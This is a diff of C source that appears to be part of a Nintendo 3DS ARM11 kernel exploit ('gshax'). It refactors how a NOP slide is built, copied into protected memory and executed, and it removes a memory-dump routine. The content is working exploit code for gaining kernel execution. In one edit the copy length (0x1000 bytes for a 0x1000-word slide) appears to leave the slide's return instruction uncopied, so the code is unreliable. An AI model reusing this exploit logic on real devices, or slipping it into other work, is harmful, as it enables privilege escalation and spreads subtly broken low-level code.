@@ -45,13 +45,13 @@ int do_gshax_copy(void *dst, void *src, unsigned int len)
 	return 0;
 }
 
-void dump_bytes(void *dst) {
-	printf("DUMPING %p\n", dst);
-	do_gshax_copy(arm11_buffer, dst, 0x20u);
+void build_nop_slide(u32* dst, unsigned int len)
+{
+	int i;
+	for (i = 0; i < len; i++)
+		dst[i] = 0xE1A00000; // ARM NOP instruction
 
-	printf(" 0: %08X  4: %08X  8: %08X\n12: %08X 16: %08X 20: %08X\n",
-			arm11_buffer[0], arm11_buffer[1], arm11_buffer[2],
-			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]);
+	dst[i-1] = 0xE12FFF1E; // ARM BX LR instruction
 }
 
 int get_version_specific_addresses()
@@ -128,8 +128,6 @@ int get_version_specific_addresses()
 int arm11_kernel_exploit_setup(void)
 {
 	unsigned int *test;
-	int i;
-	int (*nop_func)(void);
 	int *ipc_buf;
 	int model;
 
@@ -173,18 +171,12 @@ int arm11_kernel_exploit_setup(void)
 	printf("Restoring heap\n");
 	do_gshax_copy(mem_hax_mem, arm11_buffer, 0x20u);
 
-	 // part 2: trick to clear icache
-	for (i = 0; i < 0x1000; i++)
-	{
-		arm11_buffer[i] = 0xE1A00000; // ARM NOP instruction
-	}
-	arm11_buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
-	nop_func = nop_slide;
-
-	do_gshax_copy(nop_slide, arm11_buffer, 0x10000);
-
+	// Part 2: trick to clear icache
+	build_nop_slide(arm11_buffer, 0x1000);
+	do_gshax_copy(nop_slide, arm11_buffer, 0x1000);
 	HB_FlushInvalidateCache();
-	nop_func();
+
+	((void (*)(void))nop_slide)();
 
 #ifdef DEBUG_PROCESS
 	printf("Exited nop slide\n");
@@ -240,24 +232,15 @@ int doARM11Hax()
 {
 	int result = 0;
 	int i;
-	int (*nop_func)(void);
-	HB_ReprotectMemory(nop_slide, 4, 7, &result);
 
-	for (i = 0; i < 0x1000; i++)
-	{
-		nop_slide[i] = 0xE1A00000; // ARM NOP instruction
-	}
-	nop_slide[i-1] = 0xE12FFF1E; // ARM BX LR instruction
-	nop_func = nop_slide;
+	HB_ReprotectMemory(nop_slide, 4, 7, &result);
+	build_nop_slide(nop_slide, 0x1000);
 	HB_FlushInvalidateCache();
 
 	dbg_log("Testing nop slide\n");
+	((void (*)(void))nop_slide)();
+	dbg_log("Exited nop slide\n");
 
-	nop_func();
-
-#ifdef DEBUG_PROCESS
-	printf("Exited nop slide\n");
-#endif
 
 	unsigned int addr;
 	void *this = 0x08F10000;
